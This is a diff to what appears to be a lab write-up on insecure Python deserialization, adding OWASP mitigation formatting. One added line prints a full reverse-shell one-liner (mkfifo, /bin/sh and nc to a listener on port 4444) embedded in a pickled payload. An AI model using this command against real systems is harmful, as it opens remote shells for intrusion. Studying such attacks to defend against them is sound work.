@@ -43,7 +43,7 @@ Once you visit the feedback form, the value of this cookie is ***decoded*** and 
 
 ### Attack on this vulnerable application
 - `Serialize` and then ***encode*** a malicious payload
-A python class that is serialized to bytes:
+A python class, with malicious payload (`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.192 4444 > /tmp/f`) that is serialized to bytes:
 
 ![[Pasted image 20211011143653.png]]
 
@@ -331,11 +331,11 @@ root@Attacker:/tmp/test#
 ## 5. Mitigation
 [OWASP 2017 Reference](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization)
 
-The only safe architectural pattern is not to accept serialized objects from untrusted sources or to use serialization mediums that only permit primitive data types. If that is not possible, consider one of more of the following:  
-* Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.  
-* Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.  
-* Isolating and running code that deserializes in low privilege environments when possible.  
-* Log deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.  
-* Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.  
-* Monitoring deserialization, alerting if a user deserializes constantly.
+The only safe architectural pattern is **`not`** to accept serialized objects from **`untrusted`** sources or to use serialization mediums that only permit primitive data types. If that is not possible, consider one of more of the following:  
+* Implementing **integrity checks** such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.  
+* Enforcing **strict type constraints** during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.  
+* **Isolating** and running code that deserializes in low privilege environments when possible.  
+* **Log** deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.  
+* Restricting or monitoring incoming and outgoing **network connectivity** from containers or servers that deserialize.  
+* Monitoring deserialization, alerting if a user **deserializes constantly**.
 
